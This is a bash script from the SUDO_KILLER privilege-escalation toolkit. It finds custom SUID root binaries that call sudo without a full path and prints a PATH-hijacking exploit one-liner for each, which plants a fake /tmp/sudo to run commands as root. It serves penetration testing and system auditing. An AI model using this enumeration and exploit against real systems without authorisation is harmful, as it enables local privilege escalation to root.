#!/bin/bash
# This script was developed to parse and search for specifc aliases by providing sudoers file 
# V1: Date Created : 08/12/2018
# V2: Date Created : 11/02/2020
# V3: Date Created : 20/07/2023
# Date of last modification : 20/07/2023
# @TH3xACE - BLAIS David 
# https://github.com/TH3xACE/SUDO_KILLER


##### (Cosmetic) Colour output
RED="\033[01;31m"      # Issues/Errors
GREEN="\033[01;32m"    # Success
YELLOW="\033[01;33m"   # Warnings/Information
BLUE="\033[01;34m"     # Heading
BOLD="\033[01;01m"     # Highlight
RESET="\033[00m"       # Normal

csuidbin=$(find / -user root -perm -4000 -print 2>/dev/null | grep -v "/usr/*\|/bin/*")
if [ -n "$csuidbin" ]; then

    for value in $csuidbin; do
        srelpath=$(strings "$value" | grep -i sudo | grep -v "bin/sudo")
        if [ -n "$srelpath" ]; then
            echo -e "[+] ${RED}Custom SUID binary found with sudo command (no full path)${RESET}"
            echo -e "[+] ${YELLOW}It is possible to abuse environment path hijacking for the SUID binary:${RESET} $value"
            echo -e "[*] Exploit: export PATH=/tmp:\$PATH;echo '#!/bin/bash' > /tmp/sudo;echo 'id' >> /tmp/sudo; chmod +x /tmp/sudo; $value; rm /tmp/sudo"
            echo -e "[*] Don't forget to remove /tmp from PATH!\n"
        fi
    done

fi

